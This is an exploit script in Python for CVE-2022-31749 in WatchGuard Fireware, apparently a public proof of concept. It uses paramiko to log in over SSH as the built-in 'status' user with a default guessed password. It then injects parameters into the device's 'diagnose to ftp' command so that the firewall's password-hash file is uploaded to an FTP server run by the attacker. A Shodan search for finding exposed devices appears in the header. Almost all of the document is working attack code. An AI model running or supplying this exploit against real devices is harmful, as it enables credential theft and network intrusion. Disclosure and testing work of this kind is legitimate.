# Exploit Title: WatchGuard Authenticated Arbitrary File Read (CVE-2022-31749)
# Shodan Dork: https://www.shodan.io/search?query=SSH-2.0-WatchGuard
# Date: June 21, 2022
# Exploit Author: Jacob Baines
# Vendor Homepage: https://www.watchguard.com/
# Software Link: https://software.watchguard.com/SoftwareDownloads?current=true&familyId=a2RF00000009OmLMAU
# Version: Fireware 12.1.3 Update 8 and below
# Tested on: XMTv
# CVE : CVE-2022-31749
# Description: This exploit uses a parameter injection to exfiltrate the system's password file to
# a listening FTP server. The attack occurs over SSH using the bultin 'status' user. Human psychology
# suggests there is a reasonable chance that the password will be 'readonly' - although it could be
# anything. :shrug:

import time
import paramiko
import argparse
from threading import Thread
from pyftpdlib import servers
from pyftpdlib.authorizers import DummyAuthorizer
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.servers import FTPServer


def banner():
    print("   0101010001101000 0110010100100000 0110100001101111")
    print("   0110111101101011 0010000001100010 0111001001101001")
    print("    ,ggg,        gg                                     ")
    print("   dP\"\"Y8b       88                           ,dPYb,    ")
    print("   Yb, `88       88                           IP'`Yb    ")
    print("    `\"  88       88                           I8  8I   ")
    print("        88aaaaaaa88                           I8  8bgg, ")
    print("        88\"\"\"\"\"\"\"88    ,ggggg,     ,ggggg,    I8 dP\" \"8 ")
    print("        88       88   dP\"  \"Y8ggg dP\"  \"Y8ggg I8d8bggP\" ")
    print("        88       88  i8'    ,8I  i8'    ,8I   I8P' \"Yb, ")
    print("        88       Y8,,d8,   ,d8' ,d8,   ,d8'  ,d8    `Yb,")
    print("        88       `Y8P\"Y8888P\"   P\"Y8888P\"    88P      Y8")
    print("   0110111001100111 0111001100100000 0111100101101111")
    print("   0111010100100000 0110001001100001 0110001101101011")
    print("")
    print("                       jbaines-r7                    ")
    print("                     CVE-2022-31749                  ")
    print("                           🦞                        ")
    print("")

##
# Spawn an FTP server and add the albinolobster user
##
def ftp_server(lhost, lport):
    authorizer = DummyAuthorizer()
    authorizer.add_user('albinolobster', '🦞🦞🦞🦞🦞🦞', '.', perm='elradfmwMT')
    handler = FTPHandler
    handler.authorizer = authorizer
   
    server = servers.FTPServer((lhost, lport), handler)
    server.serve_forever()

##
# Poor man's readall. A good developer would add some type of
# 'expect' param, but here we are.
##
def read_all(channel):

    output = b''

    try:
        while True:
            output += channel.recv(65535)
    except:
        pass

    print(output.decode('utf-8'))


if __name__ == '__main__':

    banner()

    top_parser = argparse.ArgumentParser(description='WatchGuard \'status\' user exfiltrate password file')
    top_parser.add_argument('--rhost', action="store", dest="rhost", required=True, help="The IPv4 address to connect to")
    top_parser.add_argument('--rport', action="store", dest="rport", type=int, help="The port to connect to", default="4118")
    top_parser.add_argument('--lhost', action="store", dest="lhost", required=True, help="The address the FTP server should listen on")
    top_parser.add_argument('--lport', action="store", dest="lport", type=int, help="The port the FTP server should listen on", default="1270")
    top_parser.add_argument('--username', action="store", dest="username", help="The user to log in as", default="status")
    top_parser.add_argument('--password', action="store", dest="password", help="The password to log in with", default="readonly")
    args = top_parser.parse_args()

    print('[+] Spinning up FTP server thread')
    ftpd_thread = Thread(target=ftp_server, args=(args.lhost, args.lport, ))
    ftpd_thread.setDaemon(True)
    ftpd_thread.start()

    username = "status"
    password = "readonly"

    client = paramiko.client.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(args.rhost, args.rport, username=args.username, password=args.password, allow_agent=False, look_for_keys=False)

    channel = client.invoke_shell()
    channel.settimeout(3.0)

    channel.send('diagnose to ftp://r7:' + str(args.lport) +'/r7\n')
    read_all(channel)
    channel.send('albinolobster\n')
    read_all(channel)
    channel.send('🦞🦞🦞🦞🦞🦞 -P ' + str(args.lport) + ' ' + args.lhost + ' configd-hash.xml /etc/wg/configd-hash.xml –\n')
    read_all(channel)
    time.sleep(6)
    print('[!] Done')

